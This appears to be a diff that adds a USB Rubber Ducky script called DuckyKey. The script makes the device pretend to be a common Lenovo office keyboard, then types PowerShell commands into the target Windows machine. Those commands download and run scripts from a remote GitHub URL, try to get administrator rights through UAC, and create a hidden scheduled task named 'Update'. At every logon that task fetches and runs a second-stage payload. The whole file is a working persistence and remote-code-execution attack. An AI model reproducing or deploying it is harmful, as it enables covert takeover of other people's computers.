@@ -1,0 +1,65 @@
+REM_BLOCK
+Title        : DuckyKey
+Author       : bytequill@codebased.xyz
+Version      : 1.0
+Category     : 
+Target       : Windows Powershell 5.1
+END_REM
+
+REM If set to true it will execute a minimal payload of irm #remote_url | iex
+REM This makes the payload execute faster and doesnt need flashing every change
+DEFINE #remote FALSE
+DEFINE #remote_url https://raw.githubusercontent.com/bytequill/DuckyKey/refs/heads/main/stage1/stage1.ps1
+
+DEFINE #tryUAC TRUE
+DEFINE #stage2_url https://raw.githubusercontent.com/bytequill/DuckyKey/refs/heads/main/server/static/stage2.ps1
+DEFINE #taskname Update
+
+
+REM One of the most popular office keyboards ever
+REM VID_0461  Primax Electronics, Ltd
+REM PID_4e04  Lenovo Keyboard KB1021
+ATTACKMODE HID VID_0461 PID_4e04
+DELAY 800
+
+IF (#remote) THEN
+    GUI r
+    DELAY 600
+    STRINGLN powershell -c "irm #remote_url | iex"
+    DELAY 600
+ELSE THEN   
+    GUI r
+    DELAY 600
+    STRINGLN PowerShell
+    DELAY 600
+    
+    REM please update every time you change stage1.ps1
+
+IF (#tryUAC) THEN
+    STRING
+    if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
+        Start-Process powershell -Verb runas -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"
+        Register-ScheduledTask -Force -TaskName 'taskname'
+            -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NoProfile -Command `"irm stage2_url | iex`"') `
+            -Settings (New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries) `
+            -Trigger (New-ScheduledTaskTrigger -AtLogon)
+        `""
+        ;pause
+        ;exit
+    };
+
+    END_STRING
+END_IF
+    STRING
+    Register-ScheduledTask -Force -TaskName "#taskname" 
+    -Action New-ScheduledTaskAction -Execute "powershell.exe" -Argument '--WindowStyle Hidden -NoProfile -c "irm #stage2_url | iex"' 
+    -Settings New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries 
+    -Trigger New-ScheduledTaskTrigger -AtLogon -User $Env:UserName
+    END_STRING
+
+    ENTER
+    DELAY 600
+
+    ALT y
+END_IF
+
